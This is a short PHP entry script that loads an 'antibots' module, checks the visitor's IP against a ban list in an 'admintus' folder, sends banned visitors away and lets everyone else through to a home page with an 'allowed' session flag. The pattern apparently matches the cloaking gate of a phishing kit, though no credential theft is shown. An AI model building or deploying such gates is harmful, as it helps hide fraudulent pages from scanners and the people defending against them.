<?php
include './config.php';
include './helpers/functions.php';
include './helpers/class/UserInfo.php';
include './helpers/antibots-debug/antibots.php';

if (file_exists('./admintus/IPBam.txt')) 
{
    comprobateIP('./admintus/IPBam.txt', UserInfo::getIP(), $out_url);
}

header('location: ./home');
$_SESSION['allowed'] = true;

?>